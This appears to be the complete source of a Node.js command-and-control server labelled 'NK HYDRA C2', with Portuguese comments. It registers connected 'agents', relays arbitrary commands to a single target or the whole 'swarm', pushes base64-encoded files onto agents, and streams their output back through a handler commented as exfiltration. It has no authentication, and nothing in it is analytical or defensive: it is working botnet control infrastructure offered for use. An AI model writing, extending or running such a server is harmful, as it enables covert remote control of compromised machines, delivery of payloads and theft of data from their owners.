// SERVER.JS v6.0 - HYDRA CORE
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); // 100MB buffer

app.use(cors());

let agents = new Map();

io.on('connection', (socket) => {
    // 1. Identificação
    socket.on('identify', ({ type, id }) => {
        if (type === 'agent') {
            agents.set(id, socket.id);
            console.log(`[+] AGENT ONLINE: ${id}`);
            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id}`);
        } else {
            console.log('[+] COMMANDER UI CONNECTED');
        }
    });

    // 2. Comandos Gerais
    socket.on('cmd', (data) => {
        const { cmd, target } = data;
        if (target && target !== 'all') {
            const socketId = agents.get(target);
            if (socketId) {
                io.to(socketId).emit('exec', { cmd });
                io.emit('log', `[CMD] -> ${target}: ${cmd}`);
            } else {
                io.emit('log', `[ERR] Target ${target} not found.`);
            }
        } else {
            io.emit('exec', { cmd });
            io.emit('log', `[CMD] -> SWARM: ${cmd}`);
        }
    });

    // 3. Upload de Arquivos (UI -> Agent)
    socket.on('upload_file', (data) => {
        // data: { target, filename, b64content }
        const { target, filename, b64content } = data;
        const payload = { cmd: `write_file ${filename} ${b64content}` };
        
        if (target && target !== 'all') {
            const socketId = agents.get(target);
            if (socketId) {
                io.to(socketId).emit('exec', payload);
                io.emit('log', `[UPLOAD] Sending ${filename} to ${target}...`);
            }
        } else {
            io.emit('exec', payload);
            io.emit('log', `[UPLOAD] Broadcasting ${filename} to SWARM...`);
        }
    });

    // 4. Logs e Exfiltração (Agent -> UI)
    socket.on('stream_log', (data) => {
        io.emit('log', `[${data.from}] ${data.output}`);
    });

    socket.on('disconnect', () => {
        // Opcional: Limpar lista de agentes
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK HYDRA C2 running on port ${PORT}`));